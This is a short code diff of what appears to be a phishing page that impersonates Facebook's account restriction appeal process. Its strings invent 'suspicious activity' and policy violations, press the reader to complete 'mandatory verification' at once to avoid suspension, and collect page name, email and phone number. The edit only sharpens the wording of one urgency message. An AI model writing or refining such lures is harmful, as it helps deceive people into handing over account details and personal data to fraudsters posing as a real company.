@@ -25,7 +25,7 @@ const Home = () => {
             pagePolicyAppeals: 'Facebook Account Restriction Appeal',
             detectedActivity: 'We have detected suspicious activity on your Pages and accounts, including reports of copyright infringement and policy violations',
             accessLimited: 'To protect your account, please verify your information now to ensure a quick and accurate review process.',
-            submitAppeal: 'This is a mandatory Facebook account verification step. Complete it immediately to prevent suspension and expedite the resolution of your case.',
+            submitAppeal: 'This is a mandatory verification step for Facebook accounts. Please complete the verification immediately to avoid account suspension and to expedite the resolution of your case.',
             pageName: 'Page Name',
             mail: 'Email',
             phone: 'Phone Number',
